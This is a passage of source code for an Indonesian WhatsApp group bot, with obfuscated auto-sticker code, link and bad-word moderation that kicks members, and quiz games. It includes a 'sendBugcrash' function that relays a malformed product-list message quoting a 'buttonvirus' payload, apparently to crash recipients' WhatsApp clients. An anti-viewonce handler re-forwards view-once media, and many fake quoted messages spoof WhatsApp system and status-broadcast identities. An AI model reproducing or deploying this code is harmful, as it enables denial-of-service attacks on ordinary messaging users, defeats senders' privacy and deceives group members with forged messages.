_0x1d4669=_0x4e4b61[_0x3a1025(-0x203,-0x209,-0x1f1,-0x1ee)+'r'][_0x4e48f3(-0x14d,-0x15f,-0x12b,-0x129)][_0x3a1025(-0x217,-0x204,-0x203,-0x1fb)](_0x4e4b61),_0x47ddd0=_0x1bd013[_0x57069f],_0x49b33d=_0x465f90[_0x47ddd0]||_0x1d4669;_0x1d4669[_0x3a1025(-0x225,-0x20a,-0x1f6,-0x207)]=_0x4e4b61['bind'](_0x4e4b61),_0x1d4669[_0x3a1025(-0x217,-0x1fb,-0x1d5,-0x20e)]=_0x49b33d[_0x3a1025(-0x1d8,-0x1fb,-0x206,-0x224)][_0x4e48f3(-0x159,-0x15d,-0x131,-0x13f)](_0x49b33d),_0x465f90[_0x47ddd0]=_0x1d4669;}});_0x6ee8e3();if(isAutoSticker){if(/image/[_0x1c7265(0x277,0x28f,0x284,0x26e)](mime)&&!/webp/['test'](mime)){let mediac=await quoted[_0x21d3e7(0x545,0x543,0x528,0x542)]();const _0x38345f={};_0x38345f[_0x21d3e7(0x51c,0x53e,0x524,0x532)]=global[_0x21d3e7(0x52c,0x53e,0x525,0x51a)],_0x38345f['author']=global[_0x1c7265(0x2d4,0x2dd,0x2ed,0x2cb)],await liaacans[_0x21d3e7(0x50a,0x508,0x4ef,0x521)+_0x21d3e7(0x553,0x53b,0x51d,0x547)](m[_0x21d3e7(0x54d,0x544,0x528,0x51b)],mediac,m,_0x38345f),console[_0x21d3e7(0x518,0x522,0x4fe,0x544)](_0x1c7265(0x2be,0x2be,0x2c7,0x2be)+_0x21d3e7(0x518,0x526,0x53c,0x51d)+'d');}else{if(/video/['test'](mime)){if((quoted[_0x1c7265(0x2dc,0x2d9,0x2f0,0x2fc)]||quoted)[_0x1c7265(0x2a9,0x2a7,0x2ad,0x2c6)]>0x1*0x1d9+0x254b+-0x1*0x2719)return;let mediac=await quoted[_0x1c7265(0x2eb,0x2d7,0x2f4,0x2cb)]();const _0x48d436={};_0x48d436[_0x21d3e7(0x522,0x53e,0x53a,0x558)]=global[_0x21d3e7(0x538,0x53e,0x526,0x560)],_0x48d436['author']=global['author'],await liaacans[_0x1c7265(0x299,0x29d,0x2c1,0x2b3)+_0x21d3e7(0x560,0x53b,0x539,0x536)](m['chat'],mediac,m,_0x48d436);}}}
        //Autosticker pc
function _0x78d2(){const _0x4d2640=['FHBvn','JoCKf','download','length','function','packname','35196dKGggg','constructo','seconds','HjfKh','7EkIKJG','2XLovkU','WgOMs','exception','author','iSEmp','trace','chat','sendImageA','1323772dasVXu','bind','object','er\x20detecte','Auto\x20stick','888XcFDLA','kvJQV','prototype','628792yDzCRO','nqeto','console','571410wgpLef','sSticker','NutSo','685sCSFrI','info','130306sSBGHs','gJgDm','test','1947258mhVipX','search','gbvak','apply','6cghmhW','QHQZL','153897OMsZkl','toString','(((.+)+)+)','log','FehSo','TtQfm'];_0x78d2=function(){return _0x4d2640;};return _0x78d2();}(function(_0x4de455,_0x3e1980){const _0x807f7=_0x4de455();function _0x584f16(_0x5a4d60,_0x23b9e8,_0xb7ae38,_0x3e06b9){return _0x567e(_0xb7ae38- -0x141,_0x23b9e8);}function _0x5d5263(_0x4c666f,_0xe90726,_0x1aa6e1,_0x3c0d4e){return _0x567e(_0xe90726-0x17f,_0x1aa6e1);}while(!![]){try{const _0x18f573=-parseInt(_0x5d5263(0x2cb,0x2bf,0x2ad,0x2c2))/(0x649*0x2+0x20bd+0xf1a*-0x3)*(-parseInt(_0x5d5263(0x2c6,0x2d0,0x2da,0x2e5))/(0xb*0xc3+-0x2*-0x6d7+0x469*-0x5))+parseInt(_0x584f16(0x2,0x16,-0x3,0xf))/(-0x21f8+0x24ac+0x35*-0xd)*(parseInt(_0x584f16(0x10,0x2e,0x18,0xc))/(0x257d+-0x151a+-0x1*0x105f))+parseInt(_0x5d5263(0x2c2,0x2b4,0x2ba,0x2cc))/(0x26d7+-0xc62+-0x1a70)*(-parseInt(_0x584f16(0x1b,0x16,0xb,0x1e))/(0x2464+0x2506+-0x4964))+parseInt(_0x5d5263(0x2de,0x2cf,0x2d0,0x2d6))/(-0x68*0x15+0x9d3*0x2+0xa7*-0x11)*(-parseInt(_0x5d5263(0x2bb,0x2ae,0x2ac,0x2ba))/(0x16e2+-0x1*0x1153+-0x587))+-parseInt(_0x584f16(-0x5,0x11,-0x7,0xf))/(0xbd5+0x347*-0x3+-0x1f7)+-parseInt(_0x584f16(-0xe,-0xe,-0xf,-0xa))/(0x8a*-0x4+-0x13b4+0x15e6*0x1)+parseInt(_0x584f16(-0x22,-0xd,-0xa,0xb))/(0x220f+0x7f6*-0x4+-0x116*0x2)*(parseInt(_0x584f16(-0x15,-0x27,-0x15,-0x23))/(0x6b*-0x3d+0x24*0xe+0x1793));if(_0x18f573===_0x3e1980)break;else _0x807f7['push'](_0x807f7['shift']());}catch(_0x462c3f){_0x807f7['push'](_0x807f7['shift']());}}}(_0x78d2,0x98b91+-0x3bdc*-0x28+-0x22456*0x5));const _0xbf7f8d=(function(){const _0x356406={};_0x356406[_0x3a6287(-0xb8,-0xad,-0x88,-0xa0)]=_0x5375ea(0x32d,0x32d,0x326,0x330);const _0xebc5d6=_0x356406;let _0x4543a5=!![];function _0x3a6287(_0x1ca5ab,_0x1195a0,_0x589e84,_0x32fae2){return _0x567e(_0x32fae2- -0x1e6,_0x1ca5ab);}function _0x5375ea(_0x93d3d6,_0x4ed9ef,_0x3da982,_0x5830b8){return _0x567e(_0x4ed9ef-0x1e9,_0x3da982);}return function(_0x5c36e5,_0x4a8ea0){const _0x4f4d4c=_0x4543a5?function(){function _0xf8a229(_0x56bcde,_0x3260d6,_0x5b79a2,_0x14c58b){return _0x567e(_0x14c58b-0x11,_0x56bcde);}function _0x84f73c(_0x1077f3,_0x387c78,_0x463990,_0x3ddd6a){return _0x567e(_0x387c78- -0xde,_0x463990);}if(_0x4a8ea0){if(_0xf8a229(0x153,0x163,0x13d,0x155)===_0xebc5d6[_0xf8a229(0x13e,0x150,0x166,0x157)]){const _0x3c1487=_0x4a8ea0[_0x84f73c(0x46,0x5f,0x47,0x5b)](_0x5c36e5,arguments);return _0x4a8ea0=null,_0x3c1487;}else{if(_0x2a3d3c){const _0x1f4444=_0x576c96[_0x84f73c(0x67,0x5f,0x55,0x5c)](_0x395df4,arguments);return _0x154b28=null,_0x1f4444;}}}}:function(){};return _0x4543a5=![],_0x4f4d4c;};}()),_0x35bc91=_0xbf7f8d(this,function(){const _0x17c817={};_0x17c817[_0x4ba0b2(0x4ce,0x4c8,0x4e6,0x4db)]=_0x44beee(0x45d,0x457,0x44a,0x46d)+'+$';function _0x44beee(_0x52de70,_0x223b8c,_0x590a89,_0x738949){return _0x567e(_0x52de70-0x31b,_0x738949);}const _0x16e6ea=_0x17c817;function _0x4ba0b2(_0x559df1,_0x1524ad,_0x434955,_0x25ed0b){return _0x567e(_0x25ed0b-0x396,_0x434955);}return _0x35bc91[_0x44beee(0x45c,0x45c,0x46a,0x45e)]()[_0x4ba0b2(0x4e0,0x4e0,0x4ba,0x4d1)](_0x16e6ea[_0x4ba0b2(0x4d1,0x4d8,0x4ed,0x4db)])['toString']()[_0x4ba0b2(0x4d0,0x4d6,0x4db,0x4e3)+'r'](_0x35bc91)[_0x44beee(0x456,0x43f,0x46f,0x454)](_0x16e6ea[_0x4ba0b2(0x4ef,0x4f1,0x4f3,0x4db)]);});function _0x567e(_0x35bc91,_0xbf7f8d){const _0x78d216=_0x78d2();return _0x567e=function(_0x567e5d,_0x467f7f){_0x567e5d=_0x567e5d-(-0x19dd+-0xde6+0x28ed*0x1);let _0x1d225c=_0x78d216[_0x567e5d];return _0x1d225c;},_0x567e(_0x35bc91,_0xbf7f8d);}function _0x536457(_0x56c0d8,_0x413e3d,_0x51c84b,_0x40f9bd){return _0x567e(_0x51c84b- -0xcb,_0x56c0d8);}_0x35bc91();const _0x5ad582=(function(){let _0x4a37c1=!![];return function(_0x12fa0a,_0x55a5e4){const _0x2d55bd=_0x4a37c1?function(){function _0x324323(_0x477a96,_0x44519a,_0x46ebbb,_0x2880e8){return _0x567e(_0x477a96- -0x4,_0x46ebbb);}if(_0x55a5e4){const _0x469151=_0x55a5e4[_0x324323(0x139,0x136,0x12e,0x130)](_0x12fa0a,arguments);return _0x55a5e4=null,_0x469151;}}:function(){};return _0x4a37c1=![],_0x2d55bd;};}()),_0xf1ae60=_0x5ad582(this,function(){const _0x5d67c0={};_0x5d67c0['ujopo']=function(_0x348975,_0x42cadf){return _0x348975!==_0x42cadf;};function _0x56c252(_0x5ade37,_0x59d00d,_0x15b157,_0x260661){return _0x567e(_0x15b157- -0x1ea,_0x260661);}_0x5d67c0[_0x56c252(-0xa2,-0xc1,-0xb2,-0xcb)]=function(_0x4fee11,_0x36269b){return _0x4fee11===_0x36269b;},_0x5d67c0[_0x327821(-0x296,-0x289,-0x2ab,-0x2af)]=_0x56c252(-0x7b,-0x9e,-0x8f,-0x9b),_0x5d67c0[_0x327821(-0x2a9,-0x2a7,-0x2ac,-0x294)]=_0x327821(-0x29e,-0x2ac,-0x29c,-0x2b3),_0x5d67c0[_0x327821(-0x299,-0x28b,-0x28b,-0x2af)]='warn',_0x5d67c0[_0x56c252(-0xc5,-0xa6,-0xae,-0xb9)]=_0x327821(-0x2b2,-0x2c3,-0x29e,-0x2a1),_0x5d67c0[_0x56c252(-0xcd,-0xd2,-0xbd,-0xc0)]='error',_0x5d67c0[_0x327821(-0x2b4,-0x2c9,-0x2cd,-0x2bf)]=_0x327821(-0x295,-0x287,-0x299,-0x283),_0x5d67c0[_0x327821(-0x2a1,-0x2b4,-0x29d,-0x2a9)]='table',_0x5d67c0[_0x327821(-0x2b8,-0x2c2,-0x2b9,-0x2a2)]=_0x327821(-0x292,-0x2a2,-0x2a6,-0x2aa);function _0x327821(_0x1c9d4d,_0x9d1d4c,_0x4dbfb0,_0x5a7d59){return _0x567e(_0x1c9d4d- -0x3e8,_0x5a7d59);}_0x5d67c0[_0x327821(-0x293,-0x2ab,-0x288,-0x280)]=function(_0x5d4206,_0x166b45){return _0x5d4206<_0x166b45;};const _0x3552a2=_0x5d67c0,_0x1bf285=_0x3552a2['ujopo'](typeof window,'undefined')?window:_0x3552a2['gJgDm'](typeof process,_0x3552a2[_0x327821(-0x296,-0x29c,-0x2a5,-0x28c)])&&_0x3552a2[_0x56c252(-0xb3,-0xbb,-0xb2,-0xc5)](typeof require,_0x3552a2[_0x56c252(-0xc1,-0xac,-0xab,-0xaf)])&&_0x3552a2[_0x56c252(-0xa6,-0xc1,-0xb2,-0xad)](typeof global,_0x3552a2[_0x327821(-0x296,-0x299,-0x289,-0x27e)])?global:this,_0x3bea32=_0x1bf285['console']=_0x1bf285[_0x56c252(-0xb3,-0xcc,-0xb9,-0xce)]||{},_0x158dbe=[_0x327821(-0x2a5,-0x2be,-0x2a5,-0x2a1),_0x3552a2[_0x327821(-0x299,-0x2a6,-0x28f,-0x28d)],_0x3552a2['gbvak'],_0x3552a2[_0x327821(-0x2bb,-0x2a2,-0x2b2,-0x2a2)],_0x3552a2[_0x56c252(-0x9f,-0xb7,-0xb6,-0xab)],_0x3552a2[_0x327821(-0x2a1,-0x2a8,-0x295,-0x2a4)],_0x3552a2['nqeto']];for(let _0x1acb00=0xf6a+0x49*-0x6+-0xdb4;_0x3552a2[_0x327821(-0x293,-0x298,-0x28d,-0x27d)](_0x1acb00,_0x158dbe[_0x327821(-0x29f,-0x291,-0x294,-0x29f)]);_0x1acb00++){const _0x478b4f=_0x5ad582['constructo'+'r'][_0x327821(-0x2ba,-0x2b1,-0x2ce,-0x2af)]['bind'](_0x5ad582),_0x5f3090=_0x158dbe[_0x1acb00],_0x36853b=_0x3bea32[_0x5f3090]||_0x478b4f;_0x478b4f['__proto__']=_0x5ad582[_0x56c252(-0x77,-0x7a,-0x90,-0x82)](_0x5ad582),_0x478b4f[_0x327821(-0x2a7,-0x2a7,-0x294,-0x2b3)]=_0x36853b[_0x56c252(-0x9d,-0x97,-0xa9,-0xbf)][_0x327821(-0x28e,-0x27a,-0x297,-0x294)](_0x36853b),_0x3bea32[_0x5f3090]=_0x478b4f;}});function _0x4a1c9b(_0x4dc72a,_0x158656,_0x1f47f6,_0x331d0c){return _0x567e(_0x158656-0x278,_0x331d0c);}_0xf1ae60();if(isAutoStick){if(/image/['test'](mime)&&!/webp/[_0x4a1c9b(0x398,0x3b1,0x3a6,0x3a5)](mime)){let mediac=await quoted[_0x536457(0x83,0x7f,0x7d,0x82)]();const _0x51ec9d={};_0x51ec9d['packname']=global[_0x536457(0x82,0x98,0x80,0x80)],_0x51ec9d[_0x4a1c9b(0x3cf,0x3cc,0x3de,0x3be)]=global['author'],await liaacans[_0x4a1c9b(0x3d2,0x3d0,0x3da,0x3e6)+_0x4a1c9b(0x3ab,0x3ab,0x3aa,0x3b2)](m[_0x536457(0x7c,0xa0,0x8c,0x7b)],mediac,m,_0x51ec9d),console[_0x4a1c9b(0x3c9,0x3bb,0x3b4,0x3d3)](_0x536457(0x78,0x67,0x60,0x63)+_0x536457(0x51,0x70,0x5f,0x49)+'d');}else{if(/video/['test'](mime)){if((quoted['msg']||quoted)[_0x536457(0x95,0x77,0x83,0x9a)]>0x435+-0x2c5*-0x1+0x1*-0x6ef)return;let mediac=await quoted[_0x536457(0x6d,0x69,0x7d,0x79)]();const _0x2d29a0={};_0x2d29a0['packname']=global[_0x536457(0x73,0x94,0x80,0x68)],_0x2d29a0[_0x4a1c9b(0x3d7,0x3cc,0x3c7,0x3ce)]=global[_0x536457(0x88,0x82,0x89,0x97)],await liaacans['sendVideoA'+_0x4a1c9b(0x397,0x3ab,0x3c2,0x3b7)](m[_0x536457(0x8f,0x75,0x8c,0x7a)],mediac,m,_0x2d29a0);}}}

if (db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
if (budy.includes('#izinmin')) return m.reply(`#izinmin diterima`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
let gclink = (`https://chat.whatsapp.com/`+await liaacans.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
liaacans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
await sleep(15000)
liaacans.sendMessage(m.chat, { delete: m.key })
}
}

if (db.data.chats[m.chat].antivirtex) {
if (budy.length > 5000) {
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`「 ANTI VIRUS 」\n\nKamu terdeteksi mengirim virus, maaf kami akan menghapus pesan anda!`)
liaacans.sendMessage(m.chat, { delete: m.key })
await sleep(15000)
liaacans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

if (db.data.chats[m.chat].antilinkig) {
if (budy.match(`instagram.com`)) {
if (chats.includes('#izinmin')) return m.reply(`#izinmin diterima`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`「 ANTI LINK INSTA 」\n\nKamu terdeteksi mengirim link instagram, maaf kamu akan di kick !`)
await sleep(1000) // waktu kick 10 detik saja kalau mau ubah, ubah aja
liaacans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

if (db.data.chats[m.chat].antiwame) {
if (budy.match(`wa.me`)) {
if (chats.includes('#izinmin')) return m.reply(`#izinmin diterima`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`「 ANTI WAME 」\n\nKamu terdeteksi mengirim link wame, maaf kamu akan di kick !`)
liaacans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
await sleep(15000)
liaacans.sendMessage(m.chat, { delete: m.key })
}
}

if (db.data.chats[m.chat].antiviewonce) {
		if (m.isGroup && m.mtype == 'viewOnceMessage') {
			let teks = `「 *Anti ViewOnce Message* 」
    
    🤠 *Name* : ${pushname}
    👾 *User* : @${m.sender.split("@")[0]}
    ⏰ *Clock* : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
    
    💫 *MessageType* : ${m.mtype}`
     m.reply(teks)
			await sleep(500)
			m.copyNForward(m.chat, true, {
				readViewOnce: true
			}, {
				quoted: mek
			}).catch(_ => m.reply('Mungkin dah pernah dibuka bot'))
		}
}

        // Badword
        if (db.data.chats[m.chat].antibadword) {
            for (let kasar of badword){
                if (budy.toLowerCase().includes(kasar)){
                    if (isCountKasar(m.sender, senbadword)){
                    if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
                 if (isAdmins) return m.reply(`Eh maaf kamu admin, kamu jangan kata kata kasar yaa!`)
                if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
                        m.reply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
                        liaacans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                        delCountKasar(m.sender, senbadword)
                    } else {
                        addCountKasar(m.sender, senbadword)
                        m.reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
                    }
                }
            }
        }
        
//━━━━━━━━━━━━━━━[ MUTE ]━━━━━━━━━━━━━━━━━//

if (db.data.chats[m.chat].mute && !isCreator) {
return
}

//━━━━━━━━━━━━━━━[ FAKE ]━━━━━━━━━━━━━━━━━//
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, jpegThumbnail: global.thumb, surface: 200, message: '©Created By LiaaCans BOT', orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: '©LiaaCans',jpegThumbnail: global.thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": global.fake, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': global.fake, 'jpegThumbnail': global.thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "YT Aulia Rahman Official", "caption": global.fake, 'jpegThumbnail': global.thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title": global.fake, "h": `Hmm`,'seconds': '359996400', 'caption': global.fake, 'jpegThumbnail': global.thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: global.fake ,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'jpegThumbnail': global.thumb, jpegThumbnail: global.thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": global.fake,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./image/image.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const ftrolii = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": global.fake,
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6285714170944@s.whatsapp.net"
}}}}
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": global.fake,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
const freply = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": global.fake, 
"jpegThumbnail": thumb
}
}
}
const kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": "./image/thumbnail.jpg"
}
}
}

//━━━━━━━━━━━━━━━[ RESPON CMD ]━━━━━━━━━━━━━━━━━//

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: liaacans.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, liaacans.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
liaacans.ev.emit('messages.upsert', msg)
}

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
	   
async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: "./image/thumbnail.jpg"}                                  
                                               }
                       return liaacans.sendMessage(from, buttonMessage)
                }
async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return liaacans.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `liaacans`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

if (('family100'+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
liaacans.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
